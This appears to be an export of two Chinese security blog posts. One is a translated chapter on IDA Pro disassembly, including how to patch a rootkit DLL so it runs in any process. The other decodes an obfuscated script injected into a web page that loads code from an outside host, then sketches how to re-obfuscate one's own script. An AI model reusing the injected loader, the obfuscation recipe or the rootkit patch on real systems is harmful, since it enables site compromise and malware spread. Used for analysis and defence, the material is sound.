程序反编译如下，jnz反编译为C语言中==条件语句（也就是jne或者jump，if not equal的别名）；执行结束将会执行分支（如➊ to ➋）。jump交叉关联命令➌为jump天转后直行的命令，从主函数偏移0xF。字符j表示jump跳转后的结果。这里可以双击（_main+Fj）来改变跳转命令关联的显示。\n.text:00401004 mov [ebp+var_4], 0 .text:0040100B cmp [ebp+var_4], 0 .text:0040100F jnz short loc_401018 ➊ .text:00401011 mov [ebp+var_4], 5 .text:00401018 .text:00401018 loc_401018: ➌; CODE XREF: _main+Fj .text:00401018 ➋ mov [ebp+var_4], 2之前的列可以通过按空格键切换视图查看。graph视角对于获取虚拟分支/循环说明特别有用。绿色箭头为跳转条件满足，红色箭头为跳转条件不满足，蓝色箭头为正常部分。\n下面针对函数内调用函数的情况来看：\nvoid test() { } void main() { test(); }下面是main函数的反汇编列表。sub_401000代表了test函数。IDA自动使用sub_前缀命函数地址，指向子函数或者函数。例如当看到sub_401000（你可以直接把它当作子函数地址sub_401000阅读）。当然这里也可以通过双击函数名定位到函数。\n.text:00401010 push ebp .text:00401011 mov ebp, esp .text:00401013 call sub_401000 ➊ .text:00401018 xor eax, eax在sub_401000（test函数）开始处，IDA添加了一处代码交叉关联代码，用于代表这是函数，sub_401000，位于主函数main偏移3的位置，可以通过双击_main+3p跳转到该位置。p后缀代标控制器调用地址为（0x401000）函数的结果并继续后续的执行。\n.text:00401000 sub_401000 proc near ➋; CODE XREF: _main+3p .text:00401000 push ebp .text:00401001 mov ebp, esp .text:00401003 pop ebp .text:00401004 retn .text:00401004 sub_401000 endp2.3.7 列出所有交叉引用 交叉参考可以在审计代码的过程中快速定位字符或者函数的引用。IDA的交叉引用是定位地址的不错的方式，但是只能显示2个参数，因此你不会看到所有的交叉参考。另外...代表还有更多的交叉引用。 如果想要列出所有的交叉参考只需要点击地址名然后按X。 一个程序通常包含很多函数。一个函数可以被一个或多个函数调用，或者调用一个或多个函数。在样本分析的时候，为了快速浏览一个函数的相关信息，例如在本例中，你可以通过选择view | open subviews | function calls 来获取函数的函数调用情况。如图所示上半部分展示函数被调用情况，下半部分展示函数调用其他函数情况。通过函数调用情况，一般就可以判断这个函数的功能情况。\n2.3.8 相邻视角和图形化 IDA图形化选项是一个很好的形象化展示交叉引用的方式。在IDA图形化之前，可以使用相邻视角proximity view展示函数调用情况。点击view | open subviews | proximity browser。相邻视角中国呢，函数的数据通过节点以及交叉引用相互关联。你可以通过双击“+”钻入相邻节点函数/子函数，扩展/折叠节点。同时可以通过ctrl+鼠标滑轮，控制放大和缩小。退出相邻视角只需要在空白处右键，选择图形视图后者字符视图即可。\n与自带的视图不同，IDA还可以展示第三方应用。要使用这些图形配置，可以右键工具栏，选择Graphs，会显示5个按钮：\n通过点击这5个不同的视图，可以分别展示不同的展示方式，但是这5个视图不像图形化和相邻视角基于汇编视图可以交互。下面是不同的图形对应的不同的功能介绍：\n图标 描述 展示当前函数的外部流图表。展示的图形与IDA的交互视角很像。 展示当前函数的调用视图；这可以用来快速查看程序中函数调用关系情况；但如果程序的函数很多的话，这个视图就会显得非常大，被塞满。 这个视图显示一个函数的被交叉引用情况；如果想看一个程序的访问某个函数的不同路径，这个视图就相对比较清晰。 这个视图展示的是一个函数的交叉引用其他函数的情况；可以很清晰的展示函数调用所有其他函数。 这是一个自定义交叉引用视图，这个功能可以允许使用者定义交叉引用的一些视图生成内容和方式。 实践IDA的各项功能有助于提高逆向的水平。下面我们将根据windowsAPI影响我们的windows操作系统。我们将学到如何分辨以及解释32位和64位Windows API的功能。\n3. 反编译windows API 恶意软件通常使用windows API函数影响操作系统（例如文件系统、进程、内存以及网络配置等）。如第二章静态分析和动态分析部分，windows扩展主要依赖文件DLL动态连接库文件。可执行程序的引用和调用来自于大量DLL中的提供不同功能的API。为了调用这些dll文件，需要先将其加载到内存中，然后调用API函数。检查一个恶意样本的dll引用情况可以指导我们分析其功能和能力。下面的表格展示了部分常见的DLL以及其执行功能：\nDLL文件名 描述 Kernel32.dll 这个dll扩展出口于进程、内存、硬件、文件系统配置有关。病毒程序从这些dll文件中引入API函数，传输文件系统、内存以及进程相关配置。 Advapi32.dll 这是一个与系统服务以及注册表有关的函数。病毒程序通过使用这个dll中的函数来传输系统服务以及注册表相关的配置。 Gdi32.dll 有关图形显示的扩展函数库。 User32.dll 这个库的函数可以用来创建和操纵windows用户的洁面组建，例如窗口、桌面、菜单、消息通知、告警等等。一些病毒程序使用这个dll的函数执行DLL注入，键盘记录，鼠标记录。 msvcrt.dll 包含了c语言的标准库函数的执行库。 Ws2_32.dll和wsock32.dll 他们呢包含网络连接相关的函数。病毒通过引入这些dll的函数用来执行网络相关的任务。 wininet.dll 这个展示使用http和ftp协议的高级函数。 urlmon.dll 这是一个wininet.dll的包装，它通常用来MIME类型连接和下载网络内容。恶意程序downloaders使用这个库里的函数用来下载新病毒程序内容。 NTDLL.dll 扩展windows本地API函数和行为作为在用户程序及核心之间的转换器。例如，当一个程序在kernel32.dll（或kernelbase.dll）调用了API函数，API作为返回调用一个短票据在ntdll.dll。程序通常不会直接从ntdll.dll引用函数；ntdll.dll中的函数通常被间接的被如kernel32.dll的dll调用。ntdll.dll中的函数通常都是无文档的。病毒程序作者有时直接引用此dl中的函数。l 3.1 弄清楚Windows API 为了展示病毒程序如何使用windows API并且帮助你了解关于一个API更多的信息。以一个病毒样本为例。加载样本到IDA，在引用窗口展示出的相关windows API函数里，检查函数在windows引用情况。\n无论什么时候，在遇到windows API 函数的时候，可以通过微软的开发者MSDN中搜索或者在谷歌中搜索，https://msdn.microsoft.com/。MSDN文档对于API函数进行了相关描述，如函数参数、参数类型、返回值等。这里取Creat or open file 作为举例，如 https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx 所示。\t通过文档可以知道这个函数的功能为创建和打开文件。第一个参数（lpfilename），用于记录文件名称。第二个参数（dwdesiredaccess），说明需要的权限如读或血的权限，第5个参数也是对文件创建和打开一个已经存在的文件。\nHANDLE CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );Windows API使用匈牙利语命名变量。在这个语法中，变量前缀增加数据种类，这个有助于我们了解给数据种类。如第二个参数dwdesiredaccess，dw的前缀代表dword 32 位无符号整数。在win32 API支持的不同数据类型如(https://msdn.microsoft.com/en-us/library/windows/desktop/aa383751(v=vs.85).aspx)。下面的表格未一些数据类型：\n数据类型 描述 BYTE (b) Unsigned 8-bit value.8位无符号字节 WORD (w) Unsigned 16-bit value. 16位无符号字节 DWORD (dw) Unsigned 32-bit value. 32位无符号字节 QWORD (qw) Unsigned 64-bit value. 64位无符号字节 Char (c) 8-bit ANSI character.一个8位 Windows (ANSI) 字符 WCHAR 16-bit Unicode character. 一个16位 Windows (unicode) 字符 TCHAR 如果定义了UNICODE ，则为WCHAR ; 否则为CHAR 。一个字节的ASCII字符或2个字节的Unicode字符。 Long Pointer (LP) 这是一个指向其他数据类型的指针。例如，lpdword是一个指向Dword的指针，LPCSTR是一个字符内容。LPCTSTR是TCHAR的常量（1比特ASCII字符或2比特Unicode字符），LPSTR是不固定的字符。LPTSTR是一个不固定的TCHAR（ASCII或Unicode）字符。有的时候LP(Long Pointer)可以用P(Pointer)代替。 Handle (H) 这相当于处理数据类型。一个句柄是与对象相关的。在一个进程能够访问对象之前（例如一个文件、注册表、程序、互斥锁等等）必须先打开一个句柄对象。例如，如果一个程序想要卸乳一个文件，程序首先调用API，例如CreateFile，返回句柄到文件；然后进程使用句柄，通过句柄到写文件API，实现写入文件。 与数据类型和参数不同，之前的函数样本包括注释，例如_in_和_out_，描述了函数使用的参数和返回的值。_in_表示输入参数，调用必须通过提供参数给函数才能执行函数。_in_opt表示可选的输入参数（可以为null）。_out_表示输出的参数；表示函数将会输出参数作为返回值。这个特性对于了解函数调用后是否从存储中读取任何数据到输出函数很有帮助。_inout_对象可以让我们分辨函数参数和函数的输出。\n在交叉参考中我们可以看到API调用情况，通过查阅相关API手册，我们可以知道，相关API的输入和输出参数。以createfile为例，通过查看函数的相关的两个函数，起始地址如下：\n双击第一个参数，调转到代码反汇编窗口对应位置。并且高亮显示。通过分散，IDA提供了一个叫做快速识别库的技术（FLIRT），包括图像匹配算法用于确定函数函数是库函数还是一个引用函数（从dll引入的函数）。在这个例子中IDA能够识别引入的分散的函数，并且将其命名为CreateFileA。IDA的分辨引用函数和库函数的能力非常有用，因为当你分析恶意样本的时候，不会去浪费时间分辨是引用的函数还是库函数。IDA还会为参数添加参数的名字作为注释，标记出Windows API函数调用的对应的参数的名称。\n.text:00401708 mov dword ptr [esp+18h], 0 ; hTemplateFile .text:00401710 mov dword ptr [esp+14h], 80h ; dwFlagsAndAttributes .text:00401718 mov dword ptr [esp+10h], 3 ; dwCreationDisposition .text:00401720 mov dword ptr [esp+0Ch], 0 ; lpSecurityAttributes .text:00401728 mov dword ptr [esp+8], 3 ; dwShareMode .text:00401730 mov dword ptr [esp+4], 80000000h ; dwDesiredAccess .text:00401738 mov dword ptr [esp], offset FileName ; lpFileName .text:0040173F call ds:CreateFileA第一个参数表示需要创建的文件名lpFileName。第二个参数dwDesiredAccess内容80000000h，通过https://docs.microsoft.com/en-us/windows/win32/secauthz/access-mask-format，可以看到对应的是generic_read权限，这一部分应该在后面的针对widnows的API的详细解读中进一步细化。第5个参数值为3，通过https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea，可以知道代表OPEN_EXISTING，只有当其退出的时候打开文件或设备。\nIDA的另一个特性是列出使用象征名标记Windows API，或C标准库函数。例如在80000000h可以通过右键值，选择使用标准象征内容参数，标记内容；这个操作将会出现一个窗口展示所有有关选择的值的象征名字。你需要选择一个适当的标志名称这里就是Generic_read。用相同的方式，你可以替换掉第五个参数内容3，为象征名称，OPEN_EXISTING；\n在使用象征名替换了内容之后，反汇编窗口列被转化成下图所示内容。代码变得更加可读。在函数调用之后，句柄到文件（可以在EAX寄存器中找到）被返回。通过函数操作文件还可以通过其他API来实现，例如readfile()或者writefile()，也可以实现类似的效果：\n3.1.1 ANSI和Unicode API函数 windows支持两个相似的API设置：一个是对于ANSI字符，另一个是Unicode字符。很多函数使用一个字符作为参数，在参数的名字后面包含A或者W。例如CreateFileA。换句话说，API名称的尾部，可以让你分辨通过函数的字符的种类（ANSI或Unicode）。以上面的CreateFileA为例，A表示函数使用一个ANSI字符作为输入。相应的CreateFileW则是表示函数使用一个Unicode字符作为输入。在恶意软件分析的过程中，当你看到一个函数名为CreateFileA或CreateFileW形式，可以删掉尾字母A或W，然后在MSDN中搜索函数文档。\n3.1.2 执行API函数 你可能会遇到很多名字带有Ex后缀的函数，例如RegCreateKeyEx（扩展RegCreateKey的变体）。当Microsoft升级一个与旧函数矛盾的函数的时候，升级的函数命名在原函数名的基础上增加Ex。\n3.2 32位和64位Windows API对比 让我们看一个32位恶意样本去了解恶意样本如何运用大量API函数去影响操作系统的，让我们尝试了解如何反汇编代码，去了解恶意程序的活动。在接下来的反汇编输出中，32位的恶意样本调用了RegOpenKeyEx API开启了一个句柄执行run注册表的值。当我们执行32位恶意样本的时候，所有regOpenKeyEx的API参数被压到栈上。相关的文档可以在 https://msdn.microsoft.com/en-us/library/windows/desktop/ms724897(v=vs.85).aspx 找到。输出参数phkResult是一个变量的指针（输出的参数由**out**注释指出）在函数调用后，指向打开注册表值的句柄。这里可以注意到，phkResult的地址是从ecx寄存器复制过去的，这个地址是作为RegOpenKeyEx API的第5个参数录入的。\nlea ecx, [esp+7E8h+phkResult] ➊ push ecx ➋ ; phkResult push 20006h ; samDesired push 0 ; ulOptions push offset aSoftwareMicros ;Software\\Microsoft\\Windows\\CurrentVersion\\Run push HKEY_CURRENT_USER ; hKey call ds:RegOpenKeyExW在恶意软件通过调用RegOpenKeyEx打开run注册值后，返回的句柄（在phkResult变量存储）被移动到ecx寄存器中，并且作为RegSetValueExW的第一个参数传递。从MSDN关于这个API的文档中，可以发现使用RegSetValueEx API设置一个变量到run注册表的值中（持久化）。变量通过的第二个参数设置，system字符。对应的内容可以通过第五个参数的值去确认。从前面的描述中，可以确定eax保持由pszPath的地址的值。pszPath变量与在运行时的相关内容相关；因此通过查看代码，很难判断数据是病毒添加到注册表里的（你可以通过调试病毒样本确认）。但是在这点，通过静态分析（反汇编），你可以确定病毒添加了一个入口到注册表中作为持久化的方式：\nmov ecx, [esp+7E8h+phkResult] ➌ sub eax, edx sar eax, 1 lea edx, ds:4[eax*4] push edx ; cbData lea eax, [esp+7ECh+pszPath] ➐ push eax ➏ ; lpData push REG_SZ ; dwType push 0 ; Reserved push offset ValueName ; \"System\" ➎ push ecx ➍ ; hKey call ds:RegSetValueExW在添加了一个入口到注册表中之后，病毒通过在句柄获取值之前（存有phkResult变量）关闭句柄到注册表值，如下所示：\nmov edx, [esp+7E8h+phkResult] push edx ; hKey call esi ; RegCloseKey之前的例子展示了恶意样本如何使用多个windows API添加一个入口到注册表中，该注册遍能够在计算机重启的时候自动运行。你还可以看到，恶意样本如何获得一个对象的句柄，并分享句柄到其他API函数执行其他行为。\n当你在看从64位病毒程序反汇编输出的函数的时候，可能会略显不同，这是由于参数通过64位架构。接下的一个64位样本调用CreateFile函数。在64位架构下，在寄存器中前4个参数被使用（rcx，rdx，r8和r9），并且剩余的参数被放置在寄存器中。在接下来的反汇编中，注意到第一个参数是如何通过rcx寄存器，第二个参数在edx寄存器中，第三个参数在r8，第四个在r9寄存器中。新增的参数被放置在栈中（注意这里没有push指令），这里使用mov指令。注意IDA如何识别参数柄添加注释到指令旁边的。函数的返回值（到文件的句柄）从rax寄存器中被移动到rsi寄存器中：\nxor r9d, r9d ➍ ; lpSecurityAttributes lea rcx, [rsp+3B8h+FileName] ➊ ; lpFileName lea r8d, [r9+1] ➌ ; dwShareMode mov edx, 40000000h ➋ ; dwDesiredAccess mov [rsp+3B8h+dwFlagsAndAttributes], 80h ➏ ; dwFlagsAndAttributes mov [rsp+3B8h+dwCreationDisposition], 2 ➎ ; lpOverlapped call cs:CreateFileW mov rsi, rax ➐下面的反汇编为WriteFile API的，注意文件句柄在API调用之前被复制到rsi寄存器，现在通过writeFile函数第一个参数移动到rex寄存器。相同的方式，另一个参数被传入寄存器进入堆，如下所示：\nand qword ptr [rsp+3B8h+dwCreationDisposition], 0 lea r9,[rsp+3B8h+NumberOfBytesWritten] ; lpNumberOfBytesWritten lea rdx, [rsp+3B8h+Buffer] ; lpBuffer mov r8d, 146h ; nNumberOfBytesToWrite mov rcx, rsi ➑ ; hFile call cs:WriteFile From the preceding example,从之前的案例可以看到，病毒程序创建一个文件和写入内容到文件，但是当你查找静态代码的时候，并不那么清楚的可以看出恶意软件创建了什么文件或者写入了什么内容到文件中。例如，想要知道软件创建的文件名，你需要检查ipFileName（传入CreateFile的一个参数）地址的内容；但ipFileName变量并非硬编码，并且只有当程序运行的时候才存在。\n4. 使用IDA补丁二进制chengxu 当完成恶意程序分析，你想要修改二进制程序改变其内部工作原理或者逆向逻辑以便个人使用。你可以使用选择Edit/Patch program菜单。需要注意的是，当你使用这个菜单堆二进制进行修改的时候，你并不会直接对二进制文件本身进行修改；这个修改只会在IDA数据库中进行操作。如果需要应用修改到原始的二进制文件的话，你需要使用Apply patches to input file：\n4.1 补丁程序字节 考虑到代码通过32位恶意软件dll执行（RDSS rootkit），通过检测可以确保其运行与spoolsv.exe下面。这里的检测会使用字符对比功能；如果自负对比失败，则代码跳转到函数结束，并且回到函数调用。特殊的，这个dll的恶意行为只发生在当其被spoolsv.exe调用的时候；除此之外，其都无返回。\n10001BF2 push offset aSpoolsv_exe ; \"spoolsv.exe\" 10001BF7 push edi ; char * 10001BF8 call _stricmp ➊ 10001BFD test eax, eax 10001BFF pop ecx 10001C00 pop ecx 10001C01 jnz loc_10001CF9 [REMOVED] 10001CF9 loc_10001CF9: ➋ ; CODE XREF: DllEntryPoint+10j 10001CF9 xor eax, eax 10001CFB pop edi 10001CFC pop esi 10001CFD pop ebx 10001CFE leave 10001CFF retn 0Ch K A, Monnappa. Learning Malware Analysis: Explore the concepts, tools, and techniques to analyze and investigate Windows malware (p. 189). Packt Publishing. Kindle 版本. 假定你想要恶意dll执行恶意行为在任一程序下，例如执行在notepad.exe下面。你可以改变硬编码的字符从spoolsv.exe到notepad.exe。为了实现这个，通过点击aSpoolsv_exe定位硬编码地址，在下面的内容中展示：\n现在，将鼠标放在变量名上（aSpoolsv_exe）。此时，hex视图窗口中将会同步展示地址信息。在hex-View-1标签展示的hex和ascii导出内存地址。补丁字节内容，选择Edit/patch program/change byte；将会如下图所示带来补丁字节日志。你可以修改原始的二进制字节通过输入一个新的二进制值到栏目中。Address字段表示游标位置的虚拟地址，File offset字段指定二进制文件中字节所在的文件偏移量。 Original value字段显示当前地址的原始字节;即使你修改了这些值，该字段中的值也不会改变:\n您所做的修改将应用于IDA数据库;要将更改应用到原始可执行文件，可以选择“Edit | Patch program | apply patches to the input file”。下面的屏幕截图显示了“应用补丁到输入文件”对话框。当您点击OK时，更改将应用到原始文件;您可以通过检查“创建备份”选项来保存原始文件的备份;在这种情况下，它会以.bak扩展名保存你的原始文件:\n前面的示例演示了修补字节;以同样的方式，您可以通过选择Edit | patch program | Change word来一次打一个单词(2字节)的补丁。您还可以从十六进制视图窗口中修改字节，通过右键单击一个字节并选择Edit (F2)，您可以通过再次右键单击并选择apply changes (F2)应用更改。\n4.2 补丁命令 在之前的例子中，TDSS rootkit DLL执行了一个检查判断程序是否在spoolsv.exe下面运行。可以通过修改程序中的二进制信息将spoolsv.exe改为notepad.exe。可以通过逆向逻辑判断DLL可以运行在任意进程下面。为了实现这个想法，我们可以修改jnz命令使其变为jz，通过选择Edit｜patch program｜Assemble，如下所示。我们将要逆向逻辑并且让程序运行在spoolsv.exe下时，程序不会表现任何恶意行为表现，而运行在非spoolsv.exe时将会表现出恶意行为。在修改了命令之后，点击OK，命令将会被汇编，但是对话仍然保持打开状态，提示你在下一个地址汇编下一个命令。如果没有其他需要会变的可以点击取消结束。为了将修改保存到原始文件中，选择Edit｜patch program｜apply patches 将修改保存到文件中。\n当你给任何命令打补丁的时候，小心需要确保所有的的命令的结合是正确的；除此之外，补丁的程序可能会出现无法预料的行为。如果新的命令比原始命令短的话，你可以使用nop命令保持长度完整。如果你在汇编一个新的命令超出原始的命令，IDA将会覆盖原始程序的后面的命令，这个行为可能并非我们希望如此的。\nIDA 脚本和插件 ODA提供将本的行为，为你提供访问IDA数据库内容的许可。通过脚本程序，你可以自动的执行一些命令任务和复杂的分析操作。IDA支持两个脚本语言：IDC，原生的内置语言（类似c语言的语法）和python 脚本通过IDApython实现。在2017年9月，Hex-Rays发布的新版本IDAPython脚本 API兼容IDA7.0和最新版本IDA。在这一部分，我们将体验使用IDApython执行脚本的能力；在这一部分IDApython脚本使用最新版本IDApython API，因此需要对应IDA的版本要大于7.0，否则将无法正常工作。当我们熟悉了IDA和逆向工程的概念之后，你可能希望能够自动完成任务，结下来的资源可以帮助你开始IDApython脚本：\nThe Beginner’s Guide to IDAPython by Alexander Hanel: https://leanpub.com/IDAPython-Book Hex-Rays IDAPython documentation: https://www.hex-rays.com/products/ida/support/idapython_docs/\n5.1 执行IDA脚本 脚本可以通过多种方式执行。你可以执行标准的IDC或者IDAPython脚本通过选择File ｜ Script File。如果你只是希望执行一小段命令，而不是执行脚本文件，那么你可以通过选择File｜scrpt command（shift+F2），然后从下拉菜单中选择恰当的脚本语言（IDC或者Python）。在运行下面的脚本命令之后，当前光标位置的虚拟地址和反汇编的文本将会显示在下面的窗口中：\n另一种方式执行脚本命令是输入IDA的命令行，如下图所示：\n5.2 IDApython IDApython是基于python为IDA建立的一个特别有用的语言。他将IDA的分析特性与python结合，能够允许更多强大的功能。IDApython包含三种模块：idaapi，提供访问IDA API的访问；idautils，提供IDA更高级的功能函数；idc，一个IDC兼容模块。大部分IDApython函数允许地址以参数形式传递，当阅读IDApython文档的时候，你会找到地址被称为ea。大多IDApython函数返回地址；其中一个常见的函数是idc.get_screen_ea()，获取当前光标位置的地址：\nPython\u003eea = idc.get_screen_ea() Python\u003eprint hex(ea) 0x40206a下面的代码片段展示了通过idc.get_screen_ea()获取的地址传入idc.get_segm_name()获取与地址相关的段的名称：\nPython\u003eea = idc.get_screen_ea() Python\u003eidc.get_segm_name(ea) .text下面的代码片段，将idc.get_screen_ea()获取的当前光标的地址传入idc.generate_disasm_line()函数生成反汇编文本：\nPython\u003eea = idc.get_screen_ea() Python\u003eidc.generate_disasm_line(ea,0) push ebp下面的代码，将idc.get_screen_ea()获取的当前光标的地址传入idc.get_func_name()确定与地址相关联的函数的名称。例如，根据Alexander Hanel’s The Beginner’s Guide to IDAPython book (https://leanpub.com/IDAPython-Book):\nPython\u003eea = idc.get_screen_ea() Python\u003eidc.get_func_name(ea) _main在恶意软件分析的时候，经常的，你将会想知道如果恶意软件引入了一个特定的函数（或者很多个函数），例如CreateFile，并且在程序代码中函数被调用。你可以通过前面章节中提到的IDA的cross-references交叉关联查询特性进行查询。对于IDApython给你一个感觉，下面的例子将展示IDApython如何检查CreateFile API调用并且识别CreateFile的交叉关联。\n5.2.1 检查CreateFile API的出现 如果你还记得，在反汇编的章节，IDA尝试通过模式匹配算法来确定反汇编函数是动态库函数还是导入函数。他还从符号表中派生出名称列表；这些派生名称可以通过使用（View｜Open subview ｜ Names或者 shift+F4）打开名称窗口；名称窗口包括导入、导出和命名数据位置列表。下面的截图显示了在名称窗口中的CreateFile API函数：\n你可以通过编程的方式访问命名项。下面IDApython脚本检查通过遍历每一个命名来检查是否存在CreateFile API函数：\nimport idautils for addr, name in idautils.Names(): if \"CreateFile\" in name: print hex(addr),name前面的脚本调用idautils.Names() ，该函数返回一个命名项（元组），其中包含虚拟地址和名称。迭代命名项检查是否存在CreateFile。运行上述脚本将返回CreateFileA API，如下面的代码片段所示。自从导入函数的代码驻留到共享库（DLL）中，其只会在运行时被夹在，地址（0x407010）中列出的以下片段是导入表相关的虚拟地址（并不是CreateFileA的地址）\n0x407010 CreateFileA确定CreateFileA函数是否存在的另一种方法是使用以下代码。idc.get_name_ea_simple()函数返回CreateFileA的虚拟地址。如果CreateFileA不存在，则返回值为-1（idaapi.BADADDR）：\nimport idc import idautils ea = idc.get_name_ea_simple(\"CreateFileA\") if ea != idaapi.BADADDR: print hex(ea), idc.generate_disasm_line(ea,0) else: print \"Not Found\"5.2.2 使用IDApython代码交叉引用CreateFile 确定了CreateFileA函数的引用之后，我们尝试确定CreateFileA的交叉关联（Xrefs to）；这将会返回给我们所有调用CreateFileA的地址。下面的脚本构建在前面的脚本之上，并且对CreateFileA函数的交叉引用：\nimport idc import idautils ea = idc.get_name_ea_simple(\"CreateFileA\") if ea != idaapi.BADADDR: for ref in idautils.CodeRefsTo(ea, 1): print hex(ref), idc.generate_disasm_line(ref,0)下面是运行上述脚本生成的输出。输出显示了调用CreateFileA API函数的所有指令：\n0x401161 call ds:CreateFileA 0x4011aa call ds:CreateFileA 0x4013fb call ds:CreateFileA 0x401c4d call ds:CreateFileA 0x401f2d call ds:CreateFileA 0x401fb2 call ds:CreateFileA5.3 IDA插件 IDA插件极大的增强了IDA的功能，并且大多数开发用于IDA的第三方软件都是以插件的形式发布的。一个对恶意软件分析师和逆向工程时来说价值巨大的商业插件师Hex-Rays Decompiler(https://www.hex-rays.com/products/decompiler/)。这个插件能够把处理器代码反编译成人类刻可读的类似C相关的伪代码，从而更容易阅读代码，并可以加快分析速度。\n可以在下面的地址找到有趣的插件https://www.hex-rays.com/contests/index.shtml Hex-Rays插件页面。你也可以在https://github.com/onethawt/idaplugins-list 上找到有用的IDA插件列表。\n章节总结 本章介绍了IDA Pro:它的特性，以及如何使用它来执行静态代码分析(反汇编)。在本章中，我们还讨论了一些与Windows API相关的概念。结合您从上一章中获得的知识，并利用IDA提供的特性，可以极大地增强您的逆向工程和恶意软件分析能力。尽管反汇编允许我们理解程序做什么，但大多数变量都不是硬编码的，只有在程序执行时才被填充。在下一章中，您将学习如何在调试器的帮助下以受控的方式执行恶意软件，您还将学习如何探索二进制文件的各个方面，而它是在调试器下执行的。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析6-IDA使用",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-6-IDA%E4%BD%BF%E7%94%A8/index.html"
  },
  {
    "content": "背景： 近期同事同步了一段js说客户收到相关内容通报需要确认，如果是页面篡改理论上一定是一段混淆的代码，下面就针对此代码分析和解密加密分析。\n['e491q'][\" filter\"][\"constructor\"](((['e491q']+[])[\" constructor\"]['fromCharCode']['apply'](null,\"100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59\"['split'](/[a-zA-Z]{1,}/))))('e491q')根据我豪哥提示通过constructor、fromCharCode、apply可以在网上搜索到一段关于sojsonv4加密。看到了有关sojsonv4解密相关文章https://www.cnblogs.com/liulihaocai/p/decode_sojsonv4.html ，根据提示删除非标准格式sojsonv4，然后放到console中可以直接解。\n解密： 将e491q替换为sojson.v4\n(((['sojson.v4']+[])[\"constructor\"]['fromCharCode']['apply'](null,\"100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59\"['split'](/[a-zA-Z]{1,}/))))放在浏览器console中直接输出结果 document.writeln(\"\u003cscript src=\\'http[:]//sf[.]backmoon[.]xyz/js/jquery.min.php\\'\u003e\u003c/script\u003e\");分析： 上面的代码个人理解实际相当于下面代码\n''.constructor.fromCharCode.apply(null,\"100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59\".split(/[a-zA-Z]{1,}/))进一步实际关键代码，将字符数组进行混淆 \"100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59\".split(/[a-zA-Z]{1,}/)[\"100\", \"111\", \"99\", \"117\", \"109\", \"101\", \"110\", \"116\", \"46\", \"119\", \"114\", \"105\", \"116\", \"101\", \"108\", \"110\", \"40\", \"34\", \"60\", \"115\", \"99\", \"114\", \"105\", \"112\", \"116\", \"32\", \"115\", \"114\", \"99\", \"61\", \"92\", \"39\", \"104\", \"116\", \"116\", \"112\", \"58\", \"47\", \"47\", \"115\", \"102\", \"46\", \"98\", \"97\", \"99\", \"107\", \"109\", \"111\", \"111\", \"110\", \"46\", \"120\", \"121\", \"122\", \"47\", \"106\", \"115\", \"47\", \"106\", \"113\", \"117\", \"101\", \"114\", \"121\", \"46\", \"109\", \"105\", \"110\", \"46\", \"112\", \"104\", \"112\", \"92\", \"39\", \"62\", \"60\", \"47\", \"115\", \"99\", \"114\", \"105\", \"112\", \"116\", \"62\", \"34\", \"41\", \"59\"]也就是：\nString.fromCharCode(\"100\", \"111\", \"99\", \"117\", \"109\", \"101\", \"110\", \"116\", \"46\", \"119\", \"114\", \"105\", \"116\", \"101\", \"108\", \"110\", \"40\", \"34\", \"60\", \"115\", \"99\", \"114\", \"105\", \"112\", \"116\", \"32\", \"115\", \"114\", \"99\", \"61\", \"92\", \"39\", \"104\", \"116\", \"116\", \"112\", \"58\", \"47\", \"47\", \"115\", \"102\", \"46\", \"98\", \"97\", \"99\", \"107\", \"109\", \"111\", \"111\", \"110\", \"46\", \"120\", \"121\", \"122\", \"47\", \"106\", \"115\", \"47\", \"106\", \"113\", \"117\", \"101\", \"114\", \"121\", \"46\", \"109\", \"105\", \"110\", \"46\", \"112\", \"104\", \"112\", \"92\", \"39\", \"62\", \"60\", \"47\", \"115\", \"99\", \"114\", \"105\", \"112\", \"116\", \"62\", \"34\", \"41\", \"59\") 还原加密过程： 这里修改篡改内容为百度，实际红队利用也可以改造自己的js\ndocument.writeln(\"\u003cscript src=\\'http://baidu.com\\'\u003e\u003c/script\u003e\");to charcode 10进制 